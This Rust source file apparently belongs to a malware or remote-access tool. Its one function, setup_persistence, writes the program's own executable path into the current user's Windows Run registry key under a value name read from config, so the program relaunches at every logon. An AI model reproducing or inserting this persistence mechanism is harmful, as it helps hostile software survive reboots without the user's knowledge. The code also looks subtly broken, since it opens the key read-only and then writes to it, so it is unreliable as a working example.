use winreg::enums::*;
use winreg::RegKey;
use std::env;
use crate::config::registry_key;

pub fn setup_persistence() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = hkcu.open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
    let exe_path = env::current_exe().unwrap().to_str().unwrap().to_string();
    path.set_value(registry_key(), &exe_path).unwrap();
}